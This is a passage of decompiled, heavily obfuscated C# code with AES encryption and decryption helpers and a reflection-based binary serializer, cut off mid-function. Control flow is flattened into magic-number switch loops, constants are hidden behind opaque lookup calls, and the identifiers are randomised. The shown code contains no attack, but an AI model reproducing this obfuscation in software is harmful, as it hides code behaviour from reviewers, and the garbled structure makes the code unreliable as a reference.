		public byte[] code16 (byte[] config93)
		{
			if (config93 == null) {
				return null;
			}
			using AesManaged aesManaged = new AesManaged ();
			aesManaged.Mode = (CipherMode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d940f1566ee349e8e44");
			aesManaged.Padding = (PaddingMode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9bcfdd598d17bd394d");
			aesManaged.Key = speed9110;
			aesManaged.GenerateIV ();
			using ICryptoTransform cryptoTransform = aesManaged.CreateEncryptor ();
			byte[] array8361 = cryptoTransform.TransformFinalBlock (config93, 0, config93.Length);
			byte[] result = default(byte[]);
			byte[] array8362 = default(byte[]);
			while (true) {
				int num = -1338011532;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(-num ^ 0x790D2195)) % 6) {
					case 3u:
						break;
					default:
						num = -1338011532;
						continue;
					case 1u:
						result = array8362;
						num = (int)(~num2 ^ 0x9A7922F);
						continue;
					case 0u:
						Buffer.BlockCopy (aesManaged.IV, 0, array8362, 0, aesManaged.IV.Length);
						num = (int)(num2 + 1765915773);
						continue;
					case 2u:
						Buffer.BlockCopy (array8361, 0, array8362, aesManaged.IV.Length, array8361.Length);
						num = (int)(num2 - 1170327594);
						continue;
					case 5u:
						array8362 = new byte[aesManaged.IV.Length + array8361.Length];
						num = (int)num2 + -1676326558;
						continue;
					case 4u:
						return result;
					}
					break;
				}
			}
		}

		public byte[] status28 (byte[] height56)
		{
			if (height56 != null) {
				byte[] array8361 = default(byte[]);
				while (true) {
					int num = 1102636990;
					while (true) {
						uint num2 = (uint)(num - 651957403);
						switch (num2 % 5) {
						case 0u:
							break;
						default:
							num = 1102636990;
							continue;
						case 2u:
							goto IL_0038;
						case 3u:
							array8361 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac65ff475b9e4c75b3a")];
							Buffer.BlockCopy (height56, 0, array8361, 0, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8fef7545aa92d0e012a"));
							num = ~1919563561;
							continue;
						case 4u:
							goto end_IL_0006;
						case 1u: {
							using AesManaged aesManaged = new AesManaged ();
							aesManaged.Mode = (CipherMode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9cf7ebd3debb11ae0e");
							while (true) {
								int num3 = 1077311820;
								while (true) {
									switch ((num2 = (uint)(num3 - -1049380774)) % 4) {
									case 0u:
										break;
									default:
										num3 = 1077311820;
										continue;
									case 2u:
										aesManaged.Padding = (PaddingMode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d98dcc72eecf359e1b4");
										num3 = (int)(num2 - 1735244089);
										continue;
									case 3u:
										aesManaged.Key = speed9110;
										num3 = (int)(0 - num2 + 417658870);
										continue;
									case 1u: {
										aesManaged.IV = array8361;
										using ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor ();
										return cryptoTransform.TransformFinalBlock (height56, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f919f68b55f08c4358"), height56.Length - flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9d7f48546d0d97ca36"));
									}
									}
									break;
								}
							}
						}
						}
						break;
						IL_0038:
						num = (int)((height56.Length >= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("43c03ba078843b26a9e")) ? (num2 + 1524039049) : (0 - num2 + 1715116624));
					}
					continue;
					end_IL_0006:
					break;
				}
			}
			return null;
		}
	}
}
namespace id2898
{
	[AttributeUsage (AttributeTargets.Class | AttributeTargets.Property)]
	public class cache00 : Attribute
	{
		[CompilerGenerated]
		private readonly int sum722;

		public int config53 {
			[CompilerGenerated]
			get {
				return sum722;
			}
		}

		public cache00 (int code952)
		{
			sum722 = code952;
		}
	}
}
namespace buffer864
{
	[AttributeUsage (AttributeTargets.Class | AttributeTargets.Property)]
	public class settings964 : Attribute
	{
	}
}
namespace amount81
{
	internal class left8242
	{
		public PropertyInfo size40;

		public int path23;
	}
}
namespace previous580
{
	public static class offset009
	{
		private static readonly Dictionary<Type, List<left8242>> offset8616 = new Dictionary<Type, List<left8242>> ();

		public static byte[] code8187<status04> (status04 avg9796)
		{
			if (avg9796 == null) {
				return new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9fbe1453dd92d9cff64")];
			}
			using MemoryStream memoryStream = new MemoryStream ();
			dir3962 (avg9796, memoryStream);
			return memoryStream.ToArray ();
		}

		public static id552 size144<id552> (byte[] balance255)
		{
			if (balance255 != null) {
				goto IL_0003;
			}
			goto IL_0056;
			IL_0003:
			int num = 1398271833;
			goto IL_0008;
			IL_0008:
			id552 result = default(id552);
			while (true) {
				uint num2 = (uint)(num ^ 0x4236D4C7);
				switch (num2 % 5) {
				case 0u:
					break;
				default:
					num = 1398271833;
					continue;
				case 1u:
					goto IL_0033;
				case 3u:
					return result;
				case 4u:
					goto IL_0056;
				case 2u: {
					int state = 0;
					return (id552)key57 (balance255, ref state, typeof(id552));
				}
				}
				break;
				IL_0033:
				num = ((balance255.Length != 0) ? ((int)(num2 - 234172509)) : ((int)num2 - -1394637938));
			}
			goto IL_0003;
			IL_0056:
			result = default(id552);
			num = --1336533687;
			goto IL_0008;
		}

		private static void dir3962 (object status90, MemoryStream range60)
		{
			if (status90 == null) {
				goto IL_0006;
			}
			goto IL_0283;
			IL_0006:
			int num = -630861939;
			goto IL_000b;
			IL_000b:
			DateTime dateTime = default(DateTime);
			byte[] array8363 = default(byte[]);
			TypeCode typeCode = default(TypeCode);
			TimeSpan timeSpan = default(TimeSpan);
			IDictionary dictionary = default(IDictionary);
			int[] array8362 = default(int[]);
			int num4 = default(int);
			byte[] array8361 = default(byte[]);
			Guid guid = default(Guid);
			DictionaryEntry dictionaryEntry = default(DictionaryEntry);
			Type type = default(Type);
			while (true) {
				uint num2 = (uint)(num + 842631302);
				switch (num2 % 42) {
				case 5u:
					break;
				default:
					num = -630861939;
					continue;
				case 23u:
					goto IL_00d0;
				case 16u:
					dateTime = (DateTime)status90;
					num = (int)(num2 - 1921186409);
					continue;
				case 0u:
					return;
				case 20u:
					goto IL_011b;
				case 37u:
					range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("7604e7bb46b9e"));
					code61 (range60, BitConverter.GetBytes (dateTime.ToBinary ()));
					return;
				case 19u:
					return;
				case 40u:
					num = (int)(num2 - 1141811980);
					continue;
				case 11u:
					range60.Write (array8363, 0, array8363.Length);
					return;
				case 39u:
					switch (typeCode - flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("48dc39b9411c12b1c9e")) {
					case TypeCode.Boolean:
						goto IL_022e;
					case TypeCode.DBNull:
						goto IL_026b;
					case TypeCode.Empty:
						goto IL_040d;
					case TypeCode.Object:
						goto IL_0469;
					}
					num = (int)(0 - num2) ^ -1262668587;
					continue;
				case 32u:
					timeSpan = (TimeSpan)status90;
					range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("9f575d2999963"));
					num = (int)(num2 ^ 0x7096B4C1);
					continue;
				case 21u:
					settings324 ((string)status90, range60);
					return;
				case 22u:
					goto IL_0207;
				case 26u:
					goto IL_022e;
				case 34u:
					dictionary = status90 as IDictionary;
					num = 714473104;
					continue;
				case 33u:
					range60.WriteByte ((byte)typeCode);
					num = (int)(num2 - 634439354);
					continue;
				case 14u:
					goto IL_026b;
				case 7u:
					goto IL_0283;
				case 35u:
					goto IL_029f;
				case 27u:
					message28 (array8362 [num4], range60);
					num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e98a3b69e7ef45eba91");
					num = ~-72161983;
					continue;
				case 36u:
					goto IL_02ea;
				case 29u:
					range60.WriteByte (0);
					num = (int)(~num2) ^ -240338056;
					continue;
				case 18u:
					goto IL_0320;
				case 12u:
					goto IL_0335;
				case 6u:
					return;
				case 17u:
					range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("58c5519af499e"));
					array8363 = (byte[])status90;
					message28 (array8363.Length, range60);
					num = (int)(~num2) + -130978779;
					continue;
				case 28u:
					return;
				case 1u:
					code61 (range60, BitConverter.GetBytes (timeSpan.Ticks));
					num = (int)(0 - num2 + 326205921);
					continue;
				case 13u:
					range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("8f808a0959161"));
					num = (int)num2 - -230651820;
					continue;
				case 4u:
					return;
				case 9u:
					message28 (array8361.Length, range60);
					range60.Write (array8361, 0, array8361.Length);
					return;
				case 41u:
					goto IL_040d;
				case 2u:
					range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("9c3c36095a358"));
					num = (int)num2 ^ -253082277;
					continue;
				case 31u:
					guid = (Guid)status90;
					num = (int)(num2 + 1132508501);
					continue;
				case 10u:
					num4 = 0;
					num = (int)(num2 - 265356728);
					continue;
				case 3u:
					goto IL_0469;
				case 25u:
					return;
				case 24u: {
					int[] bits = decimal.GetBits ((decimal)status90);
					message28 (bits.Length, range60);
					array8362 = bits;
					num = -205931914;
					continue;
				}
				case 30u:
					goto IL_04a9;
				case 38u:
					array8361 = guid.ToByteArray ();
					num = (int)num2 ^ -1663194311;
					continue;
				case 8u:
					num = (int)(num2 - 1466948413);
					continue;
				case 15u:
					{
						message28 (dictionary.Count, range60);
						{
							IDictionaryEnumerator dictionaryEnumerator = dictionary.GetEnumerator ();
							try {
								while (true) {
									int num3 = ((!dictionaryEnumerator.MoveNext ()) ? 352738609 : (-357146559));
									while (true) {
										num2 = (uint)(num3 + 889770337);
										switch (num2 % 5) {
										case 2u:
											num3 = -357146559;
											continue;
										default:
											num3 = -357146559;
											continue;
										case 4u:
											break;
										case 0u:
											dir3962 (dictionaryEntry.Value, range60);
											num3 = (int)num2 + -579325603;
											continue;
										case 3u:
											dictionaryEntry = (DictionaryEntry)dictionaryEnumerator.Current;
											dir3962 (dictionaryEntry.Key, range60);
											num3 = 703101918;
											continue;
										case 1u:
											return;
										}
										break;
									}
								}
							} finally {
								IDisposable disposable = dictionaryEnumerator as IDisposable;
								if (disposable != null) {
									disposable.Dispose ();
								}
							}
						}
					}
					IL_0469:
					end752 (status90, range60);
					num = -703325551;
					continue;
					IL_040d:
					range60.WriteByte (((bool)status90) ? ((byte)1) : ((byte)0));
					num = -100906216;
					continue;
					IL_026b:
					range60.WriteByte ((byte)(sbyte)status90);
					return;
					IL_022e:
					range60.WriteByte ((byte)status90);
					num = -381804230;
					continue;
				}
				break;
				IL_04a9:
				typeCode = Type.GetTypeCode (status90.GetType ());
				num = ((typeCode == (TypeCode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4e5f56f55af44b5fe9e")) ? (-516119583) : (--1085888779));
				continue;
				IL_02ea:
				num = (((object)type != typeof(byte[])) ? 990148604 : (-315793701));
				continue;
				IL_00d0:
				type = status90.GetType ();
				num = (((object)type != typeof(Guid)) ? 90272188 : (-204179808));
				continue;
				IL_0335:
				num = ((!(status90 is TimeSpan)) ? (--764273524) : 1235458884);
				continue;
				IL_0207:
				num = ((typeCode == (TypeCode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6d4dbc9d671544b4d9c")) ? ((int)(~num2) + -1502749795) : ((int)num2 + -741556651));
				continue;
				IL_029f:
				num = ((typeCode == (TypeCode)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c99edd10bac841e36dc")) ? ((int)(num2 ^ 0x6BACAA30)) : ((int)num2 ^ -1812825897));
				continue;
				IL_0320:
				if (dictionary != null) {
					num = (int)(~num2) ^ -1350738894;
					continue;
				}
				goto IL_05b1;
				IL_011b:
				num = ((num4 < array8362.Length) ? 919358521 : 1176355127);
			}
			goto IL_0006;
			IL_0283:
			num = ((status90 is DateTime) ? (--641853506) : 145454116);
			goto IL_000b;
			IL_05b1:
			if (status90 is IEnumerable source) {
				range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("778a98d53bd9c"));
				List<object> list839 = source.Cast<object> ().ToList ();
				message28 (list839.Count, range60);
				using List<object>.Enumerator enumerator = list839.GetEnumerator ();
				while (true) {
					int num5 = (enumerator.MoveNext () ? (-1458415531) : (-884613609));
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num5 ^ -81363626)) % 4) {
						case 2u:
							num5 = -1458415531;
							continue;
						default:
							num5 = -1458415531;
							continue;
						case 3u:
							dir3962 (enumerator.Current, range60);
							num5 = -1361647166;
							continue;
						case 0u:
							break;
						case 1u:
							return;
						}
						break;
					}
				}
			}
			range60.WriteByte (flag6144.fd084e43cbed44518c63432f41e19486 ("8c8d8779d3fc1"));
			List<left8242> list840 = args51 (type);
			message28 (list840.Count, range60);
			using List<left8242>.Enumerator enumerator2 = list840.GetEnumerator ();
			while (true) {
				int num6 = ((!enumerator2.MoveNext ()) ? (--1953544554) : (--799419952));
				while (true) {
					uint num2 = (uint)(num6 + -462571686);
					switch (num2 % 4) {
					case 3u:
						num6 = 799419952;
						continue;
					default:
						num6 = 799419952;
						continue;
					case 2u:
						dir3962 (enumerator2.Current.size40.GetValue (status90, null), range60);
						num6 = -1858456377;
						continue;
					case 1u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}

		private static void end752 (object row158, MemoryStream previous7426)
		{
			if (row158 is short) {
				goto IL_000b;
			}
			goto IL_0152;
			IL_000b:
			int num = ~1490273665;
			goto IL_0011;
			IL_0011:
			byte[] array8362 = default(byte[]);
			long value3 = default(long);
			ushort value7 = default(ushort);
			ulong value9 = default(ulong);
			byte[] array8361 = default(byte[]);
			int value6 = default(int);
			double value = default(double);
			short value8 = default(short);
			char value5 = default(char);
			uint value2 = default(uint);
			float value4 = default(float);
			while (true) {
				uint num2 = (uint)(num ^ -485057967);
				switch (num2 % 42) {
				case 15u:
					break;
				default:
					num = -1490273666;
					continue;
				case 37u:
					array8362 = BitConverter.GetBytes (value3);
					num = -533996959;
					continue;
				case 14u:
					array8362 = BitConverter.GetBytes (value7);
					num = ~432053924;
					continue;
				case 36u:
					array8362 = BitConverter.GetBytes (value9);
					num = -212098879;
					continue;
				case 7u:
					goto IL_0110;
				case 33u:
					num = (int)(0 - num2) + -1984791651;
					continue;
				case 19u:
					previous7426.Write (array8361, 0, array8361.Length);
					num = (int)num2 ^ -1777429021;
					continue;
				case 1u:
					goto IL_0152;
				case 22u:
					value9 = (ulong)row158;
					num = (int)(~num2 ^ 0x5FE6927A);
					continue;
				case 41u:
					num = (int)num2 - -870004094;
					continue;
				case 13u:
					array8362 = new byte[0];
					num = ~1952239384;
					continue;
				case 6u:
					array8362 = BitConverter.GetBytes (value6);
					num = -1952239385;
					continue;
				case 21u:
					goto IL_01b6;
				case 8u:
					goto IL_01d2;
				case 25u:
					array8362 = BitConverter.GetBytes (value);
					num = -1172592508;
					continue;
				case 3u:
					value8 = (short)row158;
					num = (int)((0 - num2) ^ 0x12F23383);
					continue;
				case 35u:
					array8362 = BitConverter.GetBytes (value8);
					num = ~441960615;
					continue;
				case 4u:
					goto IL_0229;
				case 31u:
					goto IL_0245;
				case 16u:
					num = (int)num2 + -2038876707;
					continue;
				case 10u:
					goto IL_026e;
				case 11u:
					value7 = (ushort)row158;
					num = (int)num2 ^ -2144124381;
					continue;
				case 26u:
					value6 = (int)row158;
					num = (int)num2 - -1620428583;
					continue;
				case 30u:
					array8362 = BitConverter.GetBytes (value5);
					num = -1952239385;
					continue;
				case 38u:
					value5 = (char)row158;
					num = (int)(num2 + 1661071449);
					continue;
				case 27u:
					array8362 = BitConverter.GetBytes (value2);
					num = -2106962337;
					continue;
				case 0u:
					array8362 = BitConverter.GetBytes (value4);
					num = -2145659226;
					continue;
				case 23u:
					value4 = (float)row158;
					num = (int)(num2 - 1009000948);
					continue;
				case 24u:
					num = (int)(num2 + 707157209);
					continue;
				case 18u:
					value3 = (long)row158;
					num = (int)((0 - num2) ^ 0x3620E8EE);
					continue;
				case 28u:
					num = (int)num2 ^ -1678898569;
					continue;
				case 39u:
					num = (int)num2 ^ -391218160;
					continue;
				case 9u:
					num = (int)(num2 - 2065398818);
					continue;
				case 34u:
					num = (int)(num2 - 1938777045);
					continue;
				case 40u:
					array8361 = array8362;
					num = -1562017310;
					continue;
				case 2u:
					num = (int)(num2 - 2006585161);
					continue;
				case 32u:
					num = (int)num2 - -2144121915;
					continue;
				case 12u:
					value2 = (uint)row158;
					num = (int)num2 ^ -97751976;
					continue;
				case 5u:
					goto IL_03a9;
				case 20u:
					value = (double)row158;
					num = (int)num2 ^ -295304798;
					continue;
				case 17u:
					num = (int)((0 - num2) ^ 0x2D51FDCC);
					continue;
				case 29u:
					return;
				}
				break;
				IL_03a9:
				num = ((!(row158 is int)) ? (-910840827) : (-769592649));
				continue;
				IL_0110:
				num = ((!(row158 is long)) ? (~524448599) : (-408575207));
				continue;
				IL_01d2:
				num = ((!(row158 is char)) ? (-1525352390) : (~2081752140));
				continue;
				IL_026e:
				num = ((row158 is uint) ? (~387280696) : (-88827298));
				continue;
				IL_0229:
				num = ((!(row158 is double)) ? (-1849124407) : (-325393977));
				continue;
				IL_01b6:
				num = ((row158 is float) ? (-386471612) : (-1798651373));
				continue;
				IL_0245:
				num = ((!(row158 is ulong)) ? (-1034118232) : (-2099175423));
			}
			goto IL_000b;
			IL_0152:
			num = ((row158 is ushort) ? (-681442822) : (-929674672));
			goto IL_0011;
		}

		private static void message28 (int array2046, MemoryStream code988)
		{
			code61 (code988, BitConverter.GetBytes (array2046));
		}

		private static void code61 (MemoryStream start9822, byte[] cell06)
		{
			start9822.Write (cell06, 0, cell06.Length);
		}

		private static void settings324 (string previous50, MemoryStream name79)
		{
			if (previous50 == null) {
				goto IL_0003;
			}
			goto IL_006c;
			IL_0003:
			int num = -1533112005;
			goto IL_0009;
			IL_0009:
			byte[] bytes = default(byte[]);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num + 1987353919)) % 5) {
				case 0u:
					break;
				default:
					num = -1533112005;
					continue;
				case 4u:
					message28 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4424f663151b70b9d9c"), name79);
					return;
				case 1u:
					message28 (bytes.Length, name79);
					name79.Write (bytes, 0, bytes.Length);
					num = (int)(num2 - 735691653);
					continue;
				case 3u:
					goto IL_006c;
				case 2u:
					return;
				}
				break;
			}
			goto IL_0003;
			IL_006c:
			bytes = Encoding.UTF8.GetBytes (previous50);
			num = -1839509323;
			goto IL_0009;
		}

		private static object key57 (byte[] item3125, ref int state294, Type max52)
		{
			if (state294 >= item3125.Length) {
				goto IL_000a;
			}
			goto IL_02ec;
			IL_000a:
			int num = ~901406249;
			goto IL_0010;
			IL_0010:
			object result = default(object);
			byte b = default(byte);
			int num3;
			while (true) {
				uint num2 = (uint)(num ^ -971799027);
				object obj3;
				object obj2;
				object obj;
				switch (num2 % 40) {
				case 21u:
					break;
				default:
					num = -901406250;
					continue;
				case 36u:
					result = tree792 (max52);
					num = -536782734;
					continue;
				case 28u:
					obj3 = tree792 (max52);
					goto IL_0100;
				case 6u:
					result = key123 (item3125, ref state294, max52);
					num = -536782734;
					continue;
				case 23u:
					num = (int)num2 ^ -336618882;
					continue;
				case 35u:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e9618ec52f48468864"), BitConverter.ToInt16, max52);
					num = ~1590228654;
					continue;
				case 37u:
					goto IL_016a;
				case 10u:
					num = (int)num2 - -1611070791;
					continue;
				case 33u:
					num = (int)(0 - num2 + 160265499);
					continue;
				case 7u:
					goto IL_01c3;
				case 30u:
					goto IL_0201;
				case 2u:
					switch ((TypeCode)b) {
					case TypeCode.Int16:
						break;
					case TypeCode.Single:
						goto IL_016a;
					case TypeCode.UInt64:
						goto IL_01c3;
					case TypeCode.Object:
					case TypeCode.DBNull:
					case TypeCode.DateTime:
					case (TypeCode)17:
						goto IL_0201;
					default:
						goto IL_0266;
					case TypeCode.SByte:
						goto IL_02c6;
					case TypeCode.Empty:
						goto IL_02da;
					case TypeCode.Byte:
						goto IL_0335;
					case TypeCode.Char:
						goto IL_0349;
					case TypeCode.Decimal:
						goto IL_039f;
					case TypeCode.UInt16:
						goto IL_03fc;
					case TypeCode.UInt32:
						goto IL_043a;
					case TypeCode.Int64:
						goto IL_04e8;
					case TypeCode.String:
						goto IL_0525;
					case TypeCode.Double:
						goto IL_0538;
					case TypeCode.Int32:
						goto IL_058d;
					case TypeCode.Boolean:
						goto IL_05cb;
					}
					goto case 35u;
				case 14u:
					num = (int)(~num2) + -702487800;
					continue;
				case 13u:
					num = (int)num2 + -1560736002;
					continue;
				case 26u:
					switch (b - flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9dabf19ced95979b14e")) {
					case 3:
						break;
					default:
						goto IL_02bb;
					case 4:
						goto IL_0321;
					case 2:
						goto IL_03c7;
					case 5:
					case 6:
						goto IL_03e8;
					case 1:
						goto IL_04d6;
					case 0:
						goto IL_0575;
					}
					goto case 6u;
				case 9u:
					goto IL_02c6;
				case 29u:
					goto IL_02da;
				case 27u:
					goto IL_02ec;
				case 16u:
					goto IL_0321;
				case 1u:
					goto IL_0335;
				case 12u:
					goto IL_0349;
				case 39u:
					num = (int)num2 - -1275652042;
					continue;
				case 4u:
					return result;
				case 20u:
					goto IL_039f;
				case 11u:
					return tree792 (max52);
				case 34u:
					goto IL_03c7;
				case 32u:
					num = (int)(~num2) + -1094246662;
					continue;
				case 19u:
					goto IL_03e8;
				case 3u:
					goto IL_03fc;
				case 17u:
					goto IL_043a;
				case 22u:
					obj2 = tree792 (max52);
					goto IL_049a;
				case 38u:
					obj = tree792 (max52);
					goto IL_04ca;
				case 0u:
					goto IL_04d6;
				case 25u:
					goto IL_04e8;
				case 5u:
					goto IL_0525;
				case 8u:
					goto IL_0538;
				case 18u:
					goto IL_0575;
				case 31u:
					goto IL_058d;
				case 24u:
					goto IL_05cb;
				case 15u:
					{
						return result;
					}
					IL_0575:
					result = options20 (item3125, ref state294, max52);
					num = -536782734;
					continue;
					IL_04d6:
					result = key13 (item3125, ref state294);
					num = -536782734;
					continue;
					IL_03e8:
					result = temp234 (item3125, ref state294, b, max52);
					num = -274752860;
					continue;
					IL_03c7:
					result = sum08 (item3125, ref state294, max52);
					num = -536782734;
					continue;
					IL_0321:
					result = left76 (item3125, ref state294, max52);
					num = -536782734;
					continue;
					IL_02bb:
					num = ~210973629;
					continue;
					IL_05cb:
					if (state294 < item3125.Length) {
						num3 = state294;
						state294 = num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9be0f25fee963cb924");
						obj = item3125 [num3] != 0;
						goto IL_04ca;
					}
					num = ~1135202876;
					continue;
					IL_02da:
					result = tree792 (max52);
					num = -1590228655;
					continue;
					IL_02c6:
					if (state294 >= item3125.Length) {
						num = -1894851813;
						continue;
					}
					num3 = state294;
					state294 = num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8dc369b94393283f0ad");
					obj2 = (sbyte)item3125 [num3];
					goto IL_049a;
					IL_04ca:
					result = obj;
					num = ~2027714040;
					continue;
					IL_058d:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4278b338261775b9a9c"), BitConverter.ToInt32, max52);
					num = ~1590228654;
					continue;
					IL_0538:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f905a69036eb9230e30"), BitConverter.ToDouble, max52);
					num = -612133979;
					continue;
					IL_0266:
					num = (int)(num2 + 647193110);
					continue;
					IL_049a:
					result = obj2;
					num = -1590228655;
					continue;
					IL_0525:
					result = stack649 (item3125, ref state294);
					num = -1824675958;
					continue;
					IL_04e8:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("62b2cfc9f9ea7a40e9f"), BitConverter.ToInt64, max52);
					num = -1590228655;
					continue;
					IL_01c3:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9c65ffa033900a3a5df"), BitConverter.ToUInt64, max52);
					num = ~1590228654;
					continue;
					IL_0201:
					result = tree792 (max52);
					num = -1590228655;
					continue;
					IL_043a:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("548f7dbcfa0b89a559f"), BitConverter.ToUInt32, max52);
					num = -1590228655;
					continue;
					IL_03fc:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9f5b41533c7ed4ac13"), BitConverter.ToUInt16, max52);
					num = ~1590228654;
					continue;
					IL_039f:
					result = column750 (item3125, ref state294, max52);
					num = -1590228655;
					continue;
					IL_0349:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc2983a8e6944057151"), BitConverter.ToChar, max52);
					num = -1590228655;
					continue;
					IL_0100:
					result = obj3;
					num = -1590228655;
					continue;
					IL_016a:
					result = count8640 (item3125, ref state294, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("798bbaef994daae379e"), BitConverter.ToSingle, max52);
					num = ~218472516;
					continue;
					IL_0335:
					if (state294 < item3125.Length) {
						num3 = state294;
						state294 = num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("76b92ca466feb75519f");
						obj3 = item3125 [num3];
						goto IL_0100;
					}
					num = -2036652671;
					continue;
				}
				break;
			}
			goto IL_000a;
			IL_02ec:
			num3 = state294;
			state294 = num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9add9067841a077f7");
			b = item3125 [num3];
			num = ((b < flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9957dc7dd1a5071bd")) ? (-1680408265) : (-181479337));
			goto IL_0010;
		}

		private static object tree792 (Type message618)
		{
			if (!message618.IsValueType) {
				return null;
			}
			return Activator.CreateInstance (message618);
		}

		private static node4956 count8640<node4956> (byte[] message984, ref int data316, int product35, Func<byte[], int, node4956> index37, Type balance441)
		{
			if (data316 + product35 > message984.Length) {
				return (node4956)tree792 (balance441);
			}
			node4956 result = index37 (message984, data316);
			data316 += product35;
			return result;
		}

		private static object column750 (byte[] score3609, ref int args210, Type name7063)
		{
			if (args210 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f992ab4c0890c8dbbc") > score3609.Length) {
				goto IL_0015;
			}
			goto IL_011a;
			IL_0015:
			int num = -362166024;
			goto IL_001a;
			IL_001a:
			int[] array8361 = default(int[]);
			int num3 = default(int);
			while (true) {
				uint num2 = (uint)(num + -1995212573);
				switch (num2 % 11) {
				case 0u:
					break;
				default:
					num = -362166024;
					continue;
				case 2u:
					return tree792 (name7063);
				case 6u:
					array8361 = new int[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9df72dcfcc91dfe8396")];
					num = -1269564937;
					continue;
				case 3u:
					args210 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("69aa0627d5baf61429e");
					num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1d990bc3b1d19982848");
					num = (int)(num2 - 987144826);
					continue;
				case 8u:
					goto IL_00ad;
				case 10u:
					num3 = 0;
					num = (int)(0 - num2 + 262317049);
					continue;
				case 7u:
					array8361 [num3] = BitConverter.ToInt32 (score3609, args210);
					num = -2080482634;
					continue;
				case 4u:
					goto IL_00f1;
				case 5u:
					goto IL_011a;
				case 9u:
					return tree792 (name7063);
				case 1u:
					return new decimal (array8361);
				}
				break;
				IL_00f1:
				num = (int)((args210 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("43de4c4f4919aabb39d") <= score3609.Length) ? (num2 - 297306922) : (num2 - 2058360917));
				continue;
				IL_00ad:
				num = ((num3 < flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9cf9235612959ba7383")) ? (-1492124079) : (-1176480053));
			}
			goto IL_0015;
			IL_011a:
			int num4 = BitConverter.ToInt32 (score3609, args210);
			args210 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc1fc59f5d97a99474a");
			num = ((num4 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9ca292a98dbf65a461")) ? (-1975631596) : 2077941894);
			goto IL_001a;
		}

		private static string stack649 (byte[] temp40, ref int balance909)
		{
			if (balance909 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("58bced46320361adb9f") > temp40.Length) {
				goto IL_0015;
			}
			goto IL_00f1;
			IL_0015:
			int num = ~-515354581;
			goto IL_001b;
			IL_001b:
			int num3 = default(int);
			while (true) {
				uint num2 = (uint)(num + 801538487);
				switch (num2 % 10) {
				case 2u:
					break;
				default:
					num = 515354580;
					continue;
				case 7u:
					return null;
				case 0u:
					return null;
				case 1u:
					goto IL_0071;
				case 8u:
					balance909 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e459f2c4c916f52aee");
					num = (int)num2 + -1658563134;
					continue;
				case 4u:
					return null;
				case 3u:
					goto IL_00b9;
				case 6u:
					goto IL_00d0;
				case 5u:
					goto IL_00f1;
				case 9u: {
					string result = Encoding.UTF8.GetString (temp40, balance909, num3);
					balance909 += num3;
					return result;
				}
				}
				break;
				IL_00d0:
				num = (int)((balance909 + num3 <= temp40.Length) ? (~num2 + 1258756909) : (num2 - 571427319));
				continue;
				IL_00b9:
				num = ((num3 < 0) ? (-531111463) : (-761222631));
				continue;
				IL_0071:
				num = ((num3 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d94065191be05af57d7")) ? ((int)(num2 ^ 0x2DD81009)) : ((int)num2 + -170183918));
			}
			goto IL_0015;
			IL_00f1:
			num3 = BitConverter.ToInt32 (temp40, balance909);
			num = 386758431;
			goto IL_001b;
		}

		private static Guid options20 (byte[] height4012, ref int graph3904, Type cell3792)
		{
